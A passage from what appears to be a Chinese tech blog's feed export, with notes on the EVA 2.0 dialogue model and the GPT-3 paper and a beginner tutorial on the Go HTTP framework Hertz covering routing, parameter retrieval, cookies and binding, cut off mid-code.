<p>近期工作指出，在长对话中，预训练模型可能会混淆它们的角色，因为模型是在角色信息复杂的社交媒体数据上训练得到的。因此，需要为对话模型添加角色信息保证一致性。例如，PLATO-XL 在多角色对话中添加了角色嵌入。不过由于 WDC-Dialog 数据集角色信息的缺失（例如字幕中一般不会包含角色信息），如果要添加角色信息，只能强制将对话认定为两个角色间进行的对话。论文同时使用了角色嵌入和角色标识符并测试效果。</p>
<h3 id="预训练">预训练</h3>
<p>论文研究了两种预训练方法：从头开始预训练或者从长文档预训练的模型再进行预训练。直觉来看，在长文档上预训练的模型已经学到了一些知识。但是由于文档和对话的差异性，不清楚这对对话任务是否会起到正面作用。</p>
<h3 id="解码策略">解码策略</h3>
<p>论文在上尝试了以下几种不同的解码策略。虽然有研究在英文对话机器人上对这些策略进行了实验，论文认为解码策略是语言相关的，中文的结论可能不同。</p>
<ul>
<li><strong>贪心搜索（Greedy
Search）</strong>：朴素解码，每步选概率最大的 token，公式为<span class="math inline"> \(y_t=\arg\max_{y_t}
P(y_t|x;y_{&lt;t})=softmax(h_t)\)</span></li>
<li><strong> 采样（Sampling）</strong>：每步根据概率分布采样 token，公式为<span class="math inline"> \(y_t\sim
P(y_t|x;y_{&lt;t})=softmax(h_t/T)\)</span>，<span class="math inline">\(T\)</span> 为温度系数，增大低概率 token 被采样的概率。</li>
<li><strong>光束搜索（Beam
Search）</strong>：贪心搜索的改进，避免局部最优。同时维护多个解码序列，最终选择概率最大的序列。</li>
<li><strong>长度控制（Length
Control）</strong>：朴素解码策略倾向于生成短而通用的序列，长度控制可改善这一问题，常与光束搜索搭配使用。<strong>最小长度约束方法</strong>：在解码时将 &lt;EOS&gt; 的概率置 0 直至达到最小长度要求。<strong>长度惩罚</strong>：光束搜索时对候选序列分数除以<span class="math inline"> \(l^\alpha\)</span>，其中<span class="math inline"> \(l\)</span> 为序列长度，<span class="math inline">\(alpha\)</span> 越高越偏向长序列（beam
search 的 score 是<span class="math inline"> \(logp\)</span>，为负数）。</li>
<li><strong>处理重复（Handling
Repetitions）</strong>：语言模型生成普遍会出现重复现象。No-Repeat-N-Gram
策略禁止生成对话历史中存在的 n-gram。</li>
</ul>
<h2 id="实验">实验</h2>
<ul>
<li><strong>自动评估指标</strong>：uni-gram F1 (F1), ROUGE-L
(R-L),BLEU-4 (B-4), distinct 4-grams (D-4)</li>
<li><strong> 人工评估指标</strong>：合理性、特异性、一致性</li>
</ul>
<h3 id="层数">层数</h3>
<p>6-18 代表编码器 6 层，解码器 18 层。表格可以看出，层数平衡的架构是最优的。</p>
<p><img src="layer.png"></p>
<h3 id="角色信息">角色信息</h3>
<p>还是上面的表格，加入角色信息后性能有所下降。作者解释为由于数据集中角色信息的缺失，强迫模型将多角色对话认作两个角色间进行的对话反而会带来反面效果。</p>
<h3 id="预训练策略">预训练策略</h3>
<p>下两表为两种训练策略的自动和人工评估结果。可以看出，在文档预训练的模型继续训练的模型只在知识指标上效果更优，在对话指标上都不如从头训练模型。</p>
<p><img src="pretraining-auto.png"></p>
<p><img src="pretraining-human.png"></p>
<h3 id="解码策略-1">解码策略</h3>
<p>下两表为解码策略的自动和人工评估结果。贪婪搜索默认与 no-repeat-n-gram
结合起来，因为简单的贪婪搜索通常会导致重复。</p>
<p>结论：</p>
<ul>
<li>没有在所有指标上最优的解码策略</li>
<li>采样能够生成多样的回复，但会损失合理性</li>
<li>无重复 n-gram 的简单贪心解码在人类评估中产生了令人惊讶的良好性能</li>
<li>模型在最小长度约束下倾向于生成自相矛盾的响应（与英文不同）</li>
<li>光束搜索结合采样、长度惩罚、禁止重复取得了相对均衡的性能</li>
</ul>
<p><img src="decode-auto.png"></p>
<p><img src="decode-human.png"></p>
<h3 id="最终评估">最终评估</h3>
<p>论文将 EVA
2.0 和 1.0、CPM 进行了对比。结果如下两表。baseline 还是有点少。</p>
<p><img src="evaluation.png"></p>
<h2 id="举个栗子">举个栗子</h2>
<p>下面举几个栗子来具体展示一下。可以看到，EVA
2.0 虽然有时能取得较好的对话效果，但还是会有不一致、幻觉、不安全、缺少同理心这些问题。这正是谷歌 LaMDA 想要解决的问题，可以参考我的另一篇博客<a href="https://tqnwhz.github.io/blog/2022/03/19/LaMDA/#more">谷歌
LaMDA：高达 137B 参数的 “全能型” 聊天机器人</a>。</p>
<h3 id="好">好</h3>
<p><img src="nice-example.png"></p>
<h3 id="不一致">不一致</h3>
<p><img src="inconsistent-example.png"></p>
<h3 id="幻觉">幻觉</h3>
<p><img src="hallucination.png"></p>
<h3 id="不安全">不安全</h3>
<p><img src="unsafe-example.png"></p>
<h3 id="缺少同理心">缺少同理心</h3>
<p><img src="lack-empathy.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是蛮有价值的，讨论了模型规模和数据规模之外，影响模型性能的因素。类似 RoBERTa 之于 BERT，可以作为炼丹的参考。不过读完之后我最关心的几个问题还是没有解决：</p>
<ul>
<li>模型架构上，PLATO 采用的 unified
Transformer 和 EVA 的 Seq2Seq，孰优孰劣？虽然有论文做过实验，但是其模型规模、数据规模都达不到预训练模型的水平。</li>
<li>基线对比上，还是没有跟 PLATO-XL 进行比较。虽然感觉 EVA
2.0 大概率是比不过 PLATO-XL 的，但还是想了解一下差距、可能的解释、改进等。</li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>自然语言处理</tag>
        <tag>对话生成</tag>
        <tag>Transformer</tag>
      </tags>
  </entry>
  <entry>
    <title>GPT 三部曲之三</title>
    <url>/blog/2021/08/18/GPT-3/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>GPT 系列是 OpenAI 推出的预训练模型，时至今日已经包含了三个模型，今天我来读的是 GPT 系列第三部，出自 2020 年发表在 NeurIPS 上的论文《Language
Models are Few-Shot
Learners》。秉着最新的成果往往更重要的原则，GPT 系列我打算倒着读。从名字可以看出，GPT-3 关注点在于少样本学习，虽然预训练模型在下游任务微调上取得了很好的成果，但是下游任务的微调往往也需要一定规模的数据集。GPT-3 希望能够用更大的模型（1750 亿）来将微调任务转变为少样本学习任务。</p>
<span id="more"></span>
<h3 id="预训练模型">预训练模型</h3>
<p>像 BERT、GPT 此类的预训练模型，虽然经过微调后能够很好地应用于各种下游任务。但是微调任务往往也需要数万规模的标注数据集。而对于人类来说，并不需要大规模的数据集才能学习到特定任务，只需要一个简单的描述（例如，请告诉我这些句子的情绪是开心的还是低落的）或者很少的数据（这是两个勇敢的人的例子，请再给出一个勇敢的例子）。因此，如何让预训练模型能够像人一样灵活、通用地解决问题，成了研究者追求的目标。</p>
<p>解决上述问题的想法之一是通过元学习（meta-learning）。元学习的。在语言模型中，元学习意味着模型在训练阶段能够拥有识别通用模式的能力，并在推理阶段快速识别并适应特定任务，如下图所示。</p>
<p><img src="meta-learning.png"></p>
<p>GPT-2 就是通过上下文学习来达到上述效果，具体来说，GPT-2 会将任务嵌入到预料中，例如一个英语到法语的翻译任务的语料为：“”I’m
not the cleverest man in the world, but like they say <strong>in
French</strong>: Je ne suis pas un imbecile [I’m not a
fool].”，进而避免了显式的任务枚举、编码等操作。在这样的语料上训练语言模型，来达到多任务学习的效果。但是这样的一个问题就是模型（虽然有十几亿参数）可能很难学习到这样复杂的依赖关系。虽然 GPT-2 取得了一些初步的结果，但是效果仍远不如微调。</p>
<p><img src="learning-type.png"></p>
<h3 id="参数膨胀">参数膨胀</h3>
<p>自从 NLP 中预训练模型提出以来，参数越多，性能越好基本成为了大家的共识。参数膨胀也成为了预训练模型更新换代的趋势。从 2018 年 BERT 的 3 亿参数，到 GPT-2 的 15 亿参数，再到 2020 年 GPT-3 的 1750 亿参数，每次模型增大都带来了下游任务的改进。其算力的要求也让预训练模型成为大公司垄断的研究方向。</p>
<p>在论文中，作者还实验了从 1.25 亿参数到 130 亿参数间的一系列小模型，并对其在零样本、单样本、少样本实验上的性能进行了评估，结果如下图所示：</p>
<p><img src="model-size.png"></p>
<p>可以看到，三种任务上的性能都随参数的增加而得到提升。</p>
<h3 id="数据污染">数据污染</h3>
<p>在使用像 Common
Crawl 这样大规模数据集的时候，可能会出现数据污染问题：由于数据规模过大，测试集的一些样本出现在训练集之中，使得评估不准确。GPT-3 使用的是来自互联网上的文本数据，更有可能出现这样的问题。因此，作者开发了工具来量化数据污染对实验的影响，并对受较大影响的数据集进行了标注。</p>
<h2 id="实验方法">实验方法</h2>
<p>实验的设置与 GPT-2 类似，不同的是，GPT-3 对比了上下文学习的不同设置，包含以下四种方法（单样本与零样本学习区分开来的原因在于，在某些任务例如与人类对话中，单样本学习更匹配）：</p>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 39%">
<col style="width: 30%">
<col style="width: 22%">
</colgroup>
<thead>
<tr class="header">
<th>方式</th>
<th>特点</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>微调</td>
<td>在下游任务的监督数据集上更新权重</td>
<td>性能好</td>
<td>每个任务都需要较大规模的监督数据</td>
</tr>
<tr class="even">
<td>少样本学习</td>
<td>在下游任务推理时提供 K 个样本（10-100）作为演示，不更新权重</td>
<td>减少了对监督数据规模的要求</td>
<td>效果比微调差的多</td>
</tr>
<tr class="odd">
<td>单样本学习</td>
<td>除了任务的自然语言描述，只有一个演示样本。</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>无样本学习</td>
<td>只接受任务的自然语言描述，无演示样本。</td>
<td>使用起来最便利<br>最接近人类执行任务的方式</td>
<td>挑战性最强，在某些情况下非常困难</td>
</tr>
</tbody>
</table>
<p>四种方式介绍如下图所示：</p>
<p><img src="learning-type.png"></p>
<h3 id="模型">模型</h3>
<p>"GPT-3 的模型与 GPT-2 类似，除了 GPT-3 是交替使用密集 Transformer 与局部带状稀疏注意力机制的 Transformer"。这基本就是论文中对 GPT-3 模型的全部介绍了。我翻到 GPT-2 的论文，"GPT-2 是基于 Transformer 的语言模型架构，模型细节大体与 GPT 类似，除了将层标准化提前到子块的输入位置，并在最后一个自注意力机制块后加入层标准化"。套娃现象属实有点严重。</p>
<p>下面是 GPT-1 的结构，看起来就是个 12 层的 Transformer。上面提到的那些局部带状系数注意力机制的 Transformer 等到后面再补充吧。</p>
<p><img src="gpt-1.png"></p>
<h2 id="总结">总结</h2>
<p>GPT 系列的模型结构变化不大，重要的一直是实验部分，从普通的预训练语言模型到试图通过少样本学习解决各种下游任务的庞然大物。整个 GPT-3 的论文，只有十页左右在介绍非实验部分，剩下的几十页都是实验。这次因为时间原因先介绍到这里，实验部分等后续有时间再补充吧。</p>
<p>这篇论文一个最大的写作特点在于引用非常的奇怪。可能是我见识比较少，但是 word2vec，glove 这种写出来非常直观的方法，后面加个引用也非常清晰，论文中却不提缩写，只使用的作者姓首字母加年份的引用，像 word2vec、glove 的引用名分别为 MCCD13、PSM14。只看这个引用让人不知所云，还要点超链接浪费时间。</p>
<h2 id="参考">参考</h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>GPT</category>
      </categories>
      <tags>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 微服务框架 Hertz 的入门实践</title>
    <url>/blog/2024/01/18/Hertz/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Hertz 是一个 Golang 微服务 HTTP
框架，由字节跳动开源，具有高易用性、高性能、高扩展性等特点。</p>
<span id="more"></span>
<h2 id="架构">架构</h2>
<p>Hertz 的架构图如下所示，从上到下分为：</p>
<ul>
<li>应用层：提供前台的 Server、Client API
<ul>
<li>Server：参数绑定、<code>HandlerFunc</code> 注册、响应渲染</li>
<li> Client：DNS、服务发现</li>
<li>通用：Context、中间件</li>
</ul></li>
<li>路由层：在 httprouter 的基础上做了功能改进，同时支持静态路由、参数路由，支持优先级匹配、路由回溯等，为用户提供更高的自由度</li>
<li>协议层：支持多种网络协议，HTTP1、HTTP2、Websocket、QUIC 等，并支持自定义扩展</li>
<li>传输层：支持底层网络库扩展，原生适配 <code>Netpoll</code></li>
</ul>
<p>在整体架构之外，Hertz 还提供了：</p>
<ul>
<li>命令行工具 <code>hz</code>：根据 IDL 生成 / 更新项目脚手架，提供开箱即用的能力</li>
<li>公共组件 <code>common</code>：提供通用能力，包含错误处理、单元测试能力、可观测性（Log、Trace、Metrics
等）</li>
</ul>
<p><img src="hertz.png"></p>
<h2 id="快速上手">快速上手</h2>
<h3 id="环境准备">环境准备</h3>
<p>可以按照<a href="https://www.cloudwego.io/zh/docs/hertz/getting-started/#安装命令行工具-hz">快速开始
| CloudWeGo</a> 教程，安装 Golang 环境、Hertz 框架与 hz 工具。</p>
<h3 id="pingpong">pingpong</h3>
<p>新建 hertz_demo 项目，创建 main.go，代码如下</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/common/utils"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol/consts"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="comment">// 创建默认服务器，可以传入选项更改行为</span></span><br><span class="line">	h := server.Default()</span><br><span class="line">	<span class="comment">// 注册路由和HandlerFunc</span></span><br><span class="line">	h.GET(<span class="string">"/ping"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c context.Context, ctx *app.RequestContext)</span></span> {</span><br><span class="line">		ctx.JSON(consts.StatusOK, utils.H{<span class="string">"message"</span>: <span class="string">"pong"</span>})</span><br><span class="line">	})</span><br><span class="line">	<span class="comment">// 启动服务器</span></span><br><span class="line">	h.Spin()</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行以下命令，安装依赖并启动服务。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">go mod tidy</span><br><span class="line">go run .</span><br></pre></td></tr></tbody></table></figure>
<p>可以观察到以下输出：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">2024/01/18 12:22:22.235809 engine.go:668: [Debug] HERTZ: Method=GET    absolutePath=/ping                     --&gt; handlerName=main.main.func1 (num=2 handlers)</span><br><span class="line">2024/01/18 12:22:22.235951 engine.go:396: [Info] HERTZ: Using network library=netpoll</span><br><span class="line">2024/01/18 12:22:22.237303 transport.go:115: [Info] HERTZ: HTTP server listening on address=[::]:8888</span><br></pre></td></tr></tbody></table></figure>
<p>日志中可以看到绑定的路由 <code>/ping</code> 与 HandlerFunc
<code>main.main.func1</code>（匿名函数），以及使用的网络库 <code>netpoll</code>，服务默认启动在 8888 端口。在另一个 shell 中进行测试，验证成功。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ curl http://localhost:8888/ping</span><br><span class="line">{<span class="string">"message"</span>:<span class="string">"pong"</span>}% </span><br></pre></td></tr></tbody></table></figure>
<h3 id="路由注册">路由注册</h3>
<p>点进 <code>h.Get</code> 函数，签名如下，允许为一个路由绑定多个 Handler（不能超过 63 个），进行链式处理，<code>Get</code> 的返回值同样为 <code>IRoutes</code> 接口，可以链式完成路由注册。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(group *RouterGroup)</span> <span class="title">GET</span><span class="params">(relativePath <span class="keyword">string</span>, handlers ...app.HandlerFunc)</span> <span class="title">IRoutes</span></span> </span><br><span class="line"><span class="comment">// app.HandlerFunc</span></span><br><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(c context.Context, ctx *RequestContext)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>HandlerFunc 是一个无参函数，接收两个参数：</p>
<ul>
<li>Context：标准长周期上下文，用于在 RPC Client 或者日志、Tracing
等组件间传递</li>
<li> RequestContext：短周期请求上下文，生命周期仅限于一次 HTTP 请求内</li>
</ul>
<p>设置两种上下文的原因在于，RPC、日志中的 context 可能需要异步传递和处理，短周期的 RequestContext 可能会出现数据不一致问题。</p>
<h3 id="响应渲染">响应渲染</h3>
<p>Hertz 支持渲染 html、json、xml 等格式作为响应，最常用的就是 json。在上面的例子中，使用以下函数完成渲染，接受 Http 响应码和任意的对象，在 <code>Render</code> 函数中完成响应码的设置、Content-type 的设置，并把 json 序列化后写入 Response
body。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// JSON serializes the given struct as JSON into the response body.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It also sets the Content-Type as "application/json".</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *RequestContext)</span> <span class="title">JSON</span><span class="params">(code <span class="keyword">int</span>, obj <span class="keyword">interface</span>{})</span></span> {</span><br><span class="line">	ctx.Render(code, render.JSONRender{Data: obj})</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其他格式的渲染与之类似，这里就不赘述了。</p>
<h3 id="参数获取">参数获取</h3>
<p>上面的例子没有提到参数如何获取，补充如下</p>
<h4 id="query">query</h4>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Query string parameters are parsed using the existing underlying request object.</span></span><br><span class="line"><span class="comment">// The request responds to url matching: /welcome?firstname=Jane&amp;lastname=Doe&amp;food=apple&amp;food=fish</span></span><br><span class="line">h.GET(<span class="string">"/welcome"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 获取单个Query参数，提供默认值</span></span><br><span class="line">    firstname := c.DefaultQuery(<span class="string">"firstname"</span>, <span class="string">"Guest"</span>)</span><br><span class="line">    <span class="comment">// shortcut for c.Request.URL.Query().Get("lastname")</span></span><br><span class="line">    <span class="comment">// 默认空值</span></span><br><span class="line">    lastname := c.Query(<span class="string">"lastname"</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 迭代Query参数</span></span><br><span class="line">    <span class="comment">// Iterate all queries and store the one with meeting the conditions in favoriteFood</span></span><br><span class="line">    <span class="keyword">var</span> favoriteFood []<span class="keyword">string</span></span><br><span class="line">    c.QueryArgs().VisitAll(<span class="function"><span class="keyword">func</span><span class="params">(key, value []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">string</span>(key) == <span class="string">"food"</span> {</span><br><span class="line">            favoriteFood = <span class="built_in">append</span>(favoriteFood, <span class="keyword">string</span>(value))</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"Hello %s %s, favorite food: %s"</span>, firstname, lastname, favoriteFood)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h4 id="form">form</h4>
<p>form 有两种 content-type，需要选择对应的方法。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// content-type : application/x-www-form-urlencoded</span></span><br><span class="line">h.POST(<span class="string">"/urlencoded"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 单个参数，返回类型 string</span></span><br><span class="line">    name := c.PostForm(<span class="string">"name"</span>)</span><br><span class="line">    message := c.PostForm(<span class="string">"message"</span>)</span><br><span class="line">	<span class="comment">// 迭代所有参数</span></span><br><span class="line">    c.PostArgs().VisitAll(<span class="function"><span class="keyword">func</span><span class="params">(key, value []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">string</span>(key) == <span class="string">"name"</span> {</span><br><span class="line">            fmt.Printf(<span class="string">"This is %s!"</span>, <span class="keyword">string</span>(value))</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"name: %s; message: %s"</span>, name, message)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// content-type : multipart/form-data</span></span><br><span class="line">h.POST(<span class="string">"/formdata"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 单个参数，返回类型 []byte</span></span><br><span class="line">    id := c.FormValue(<span class="string">"id"</span>)</span><br><span class="line">    name := c.FormValue(<span class="string">"name"</span>)</span><br><span class="line">    message := c.FormValue(<span class="string">"message"</span>)</span><br><span class="line">	<span class="comment">// 迭代所有参数</span></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"id: %s; name: %s; message: %s\n"</span>, id, name, message)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h4 id="cookie">cookie</h4>
<p>注意 cookie 是单条获取、单个写入的，如果要写入多个 cookie，需要重复多次。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">h.GET(<span class="string">"/cookie"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    mc := <span class="string">"myCookie"</span></span><br><span class="line">    <span class="comment">// get specific key</span></span><br><span class="line">    <span class="comment">// 获取cookie值</span></span><br><span class="line">    val := c.Cookie(mc)</span><br><span class="line">    <span class="comment">// 新建cookie</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="literal">nil</span> {</span><br><span class="line">        <span class="comment">// set a cookie</span></span><br><span class="line">        fmt.Printf(<span class="string">"There is no cookie named: %s, and make one...\n"</span>, mc)</span><br><span class="line">        cookie := protocol.AcquireCookie()</span><br><span class="line">        <span class="comment">// 只能设置一个key、一个value</span></span><br><span class="line">        cookie.SetKey(<span class="string">"myCookie"</span>)</span><br><span class="line">        cookie.SetValue(<span class="string">"a nice cookie!"</span>)</span><br><span class="line">        <span class="comment">// 有效时间</span></span><br><span class="line">        cookie.SetExpire(time.Now().Add(<span class="number">3600</span> * time.Second))</span><br><span class="line">        cookie.SetPath(<span class="string">"/"</span>)</span><br><span class="line">        cookie.SetHTTPOnly(<span class="literal">true</span>)</span><br><span class="line">        cookie.SetSecure(<span class="literal">false</span>)</span><br><span class="line">        <span class="comment">// 写入响应头</span></span><br><span class="line">        c.Response.Header.SetCookie(cookie)</span><br><span class="line">        <span class="comment">// 将cookie对象放回cookie池中</span></span><br><span class="line">        protocol.ReleaseCookie(cookie)</span><br><span class="line">        c.WriteString(<span class="string">"A cookie is ready."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"Got a cookie: %s\nAnd eat it!"</span>, val)</span><br><span class="line">    <span class="comment">// instruct upload_file to delete a cookie</span></span><br><span class="line">    <span class="comment">// DelClientCookie instructs the upload_file to remove the given cookie.</span></span><br><span class="line">    <span class="comment">// This doesn't work for a cookie with specific domain or path,</span></span><br><span class="line">    <span class="comment">// you should delete it manually like:</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//      c := AcquireCookie()</span></span><br><span class="line">    <span class="comment">//      c.SetKey(mc)</span></span><br><span class="line">    <span class="comment">//      c.SetDomain("example.com")</span></span><br><span class="line">    <span class="comment">//      c.SetPath("/path")</span></span><br><span class="line">    <span class="comment">//      c.SetExpire(CookieExpireDelete)</span></span><br><span class="line">    <span class="comment">//      h.SetCookie(c)</span></span><br><span class="line">    <span class="comment">//      ReleaseCookie(c)</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 删除 Response 中的 cookie</span></span><br><span class="line">    c.Response.Header.DelClientCookie(mc)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造新的 cookie</span></span><br><span class="line">    <span class="comment">// construct the full struct of a cookie in response's header</span></span><br><span class="line">    respCookie := protocol.AcquireCookie()</span><br><span class="line">    respCookie.SetKey(mc)</span><br><span class="line">    c.Response.Header.Cookie(respCookie)</span><br><span class="line">    fmt.Printf(<span class="string">"(The expire time of cookie is set to: %s)\n"</span>, respCookie.Expire())</span><br><span class="line">    protocol.ReleaseCookie(respCookie)</span><br><span class="line">    c.WriteString(<span class="string">"The cookie has been eaten."</span>)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h3 id="参数绑定">参数绑定</h3>
<p>参数绑定包含以下 API：</p>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 74%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">API</th>
<th style="text-align: left;"> 说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"> ctx.BindAndValidate</td>
<td style="text-align: left;"> 利用下述的 go-tag
进行参数绑定，并在绑定成功后做一次参数校验 (如果有校验 tag 的话)</td>
</tr>
<tr class="even">
<td style="text-align: left;">ctx.Bind</td>
<td style="text-align: left;"> 同 <code>BindAndValidate</code>
但是不做参数校验</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindQuery</td>
<td style="text-align: left;"> 绑定所有 Query 参数，相当于给每一个 field
声明一个 <code>query</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindHeader</td>
<td style="text-align: left;"> 绑定所有 Header 参数，相当于给每一个 field
声明一个 <code>header</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindPath</td>
<td style="text-align: left;"> 绑定所有 Path 参数，相当于给每一个 field
声明一个 <code>path</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindForm</td>
<td style="text-align: left;"> 绑定所有 Form 参数，相当于给每一个 field
声明一个 <code>form</code> tag，需要 Content-Type
为：<code>application/x-www-form-urlencoded</code>/<code>multipart/form-data</code>,
适用于没写 tag 的场景</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindJSON</td>
<td style="text-align: left;"> 绑定 JSON Body，调用
<code>json.Unmarshal()</code> 进行反序列化，需要 Body 为
<code>application/json</code> 格式</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindProtobuf</td>
<td style="text-align: left;"> 绑定 Protobuf Body，调用
<code>proto.Unmarshal()</code> 进行反序列化，需要 Body 为
<code>application/x-protobuf</code> 格式</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindByContentType</td>
<td style="text-align: left;"> 根据 Content-Type
来自动选择绑定的方法，其中 GET 请求会调用 <code>BindQuery</code>, 带有
Body 的请求会根据 Content-Type 自动选择</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.Validate</td>
<td style="text-align: left;"> 进行参数校验，需要校验 tag 配合使用
(默认使用 vd tag 校验)</td>
</tr>
</tbody>
</table>
<p>自定义函数校验的例子如下。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/client"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server/binding"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol/consts"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 使用test函数进行校验</span></span><br><span class="line"><span class="keyword">type</span> ValidateStruct <span class="keyword">struct</span> {</span><br><span class="line">	A <span class="keyword">string</span> <span class="string">`query:"a" vd:"test($)"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	validateConfig := binding.NewValidateConfig()</span><br><span class="line">    <span class="comment">// 注册校验函数</span></span><br><span class="line">	validateConfig.MustRegValidateFunc(<span class="string">"test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(args ...<span class="keyword">interface</span>{})</span> <span class="title">error</span></span> {</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span> {</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">"the args must be one"</span>)</span><br><span class="line">		}</span><br><span class="line">		s, _ := args[<span class="number">0</span>].(<span class="keyword">string</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">"123"</span> {</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">"the args can not be 123"</span>)</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	})</span><br><span class="line">	h := server.Default(server.WithHostPorts(<span class="string">"127.0.0.1:8080"</span>))</span><br><span class="line"></span><br><span class="line">	h.GET(<span class="string">"customValidate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">		<span class="keyword">var</span> req ValidateStruct</span><br><span class="line">        <span class="comment">// 绑定参数</span></span><br><span class="line">		err := 